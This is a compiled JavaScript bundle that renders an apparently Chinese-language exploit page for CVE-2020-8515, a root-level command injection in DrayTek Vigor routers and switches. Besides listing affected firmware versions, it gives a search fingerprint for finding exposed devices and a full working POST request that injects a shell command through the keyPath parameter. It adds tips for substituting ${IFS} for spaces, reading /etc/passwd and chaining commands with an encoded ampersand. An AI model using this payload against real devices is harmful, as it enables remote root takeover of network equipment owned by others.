(window.webpackJsonp=window.webpackJsonp||[]).push([[194],{1339:function(t,a,e){t.exports=e.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-7231530.9a6d5960.png"},1340:function(t,a,e){t.exports=e.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220314121856526.371731f1.png"},1341:function(t,a,e){t.exports=e.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220314121906002.e2faeb7f.png"},2938:function(t,a,e){"use strict";e.r(a);var s=e(64),c=Object(s.a)({},(function(){var t=this,a=t._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"draytek企业网络设备-远程命令执行-cve-2020-8515"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#draytek企业网络设备-远程命令执行-cve-2020-8515"}},[t._v("#")]),t._v(" DrayTek企业网络设备 远程命令执行 CVE-2020-8515")]),t._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),a("p",[t._v("DrayTek URI未能正确处理SHELL字符，远程攻击者可以利用该漏洞提交特殊的请求，可以ROOT权限执行任意命令。")]),t._v(" "),a("p",[t._v("远程命令注入漏洞被标记为CVE-2020-8515，主要影响了DrayTek Vigor网络设备，包括企业交换机、路由器、负载均衡器和VPN网关。")]),t._v(" "),a("h2",{attrs:{id:"漏洞影响"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),a("a-checkbox",{attrs:{checked:""}},[t._v("Vigor2960 < v1.5.1")]),a("br"),t._v(" "),a("a-checkbox",{attrs:{checked:""}},[t._v("Vigor300B < v1.5.1")]),a("br"),t._v(" "),a("a-checkbox",{attrs:{checked:""}},[t._v("Vigor3900 < v1.5.1")]),a("br"),t._v(" "),a("a-checkbox",{attrs:{checked:""}},[t._v("VigorSwitch20P2121 <= v2.3.2")]),a("br"),t._v(" "),a("a-checkbox",{attrs:{checked:""}},[t._v("VigorSwitch20G1280 <= v2.3.2")]),a("br"),t._v(" "),a("a-checkbox",{attrs:{checked:""}},[t._v("VigorSwitch20P1280 <= v2.3.2")]),a("br"),t._v(" "),a("a-checkbox",{attrs:{checked:""}},[t._v("VigorSwitch20G2280 <= v2.3.2")]),a("br"),t._v(" "),a("a-checkbox",{attrs:{checked:""}},[t._v("VigorSwitch20P2280 <= v2.3.2")]),a("br"),t._v(" "),a("h2",{attrs:{id:"网络测绘"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),a("a-checkbox",{attrs:{checked:""}},[t._v('title="Vigor 2960"')]),a("br"),t._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),a("p",[t._v("登录页面抓包")]),t._v(" "),a("p",[a("img",{attrs:{src:e(1339),alt:""}})]),t._v(" "),a("p",[t._v("请求包如下")]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("POST /cgi-bin/mainfunction.cgi HTTP/1.1\n\nConnection: close\nContent-Length: 67\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36\nContent-Type: text/plain; charset=UTF-8\nAccept: */*\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6\n\naction=login&keyPath=%27%0A%2fbin%2fls%0A%27&loginUser=a&loginPwd=a\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br"),a("span",{staticClass:"line-number"},[t._v("8")]),a("br"),a("span",{staticClass:"line-number"},[t._v("9")]),a("br"),a("span",{staticClass:"line-number"},[t._v("10")]),a("br"),a("span",{staticClass:"line-number"},[t._v("11")]),a("br"),a("span",{staticClass:"line-number"},[t._v("12")]),a("br"),a("span",{staticClass:"line-number"},[t._v("13")]),a("br"),a("span",{staticClass:"line-number"},[t._v("14")]),a("br")])]),a("p",[a("img",{attrs:{src:e(1340),alt:""}})]),t._v(" "),a("p",[t._v("其中出现注入点的参数为 "),a("code",[t._v("keyPath")])]),t._v(" "),a("p",[t._v("出现空格需要替换，例如 cat /etc/passwd --\x3e cat${IFS}/etc/passwd")]),t._v(" "),a("p",[t._v("可以使用 & 执行额外一条命令 (URL编码为 %26)")]),t._v(" "),a("p",[a("img",{attrs:{src:e(1341),alt:""}})])],1)}),[],!1,null,null,null);a.default=c.exports}}]);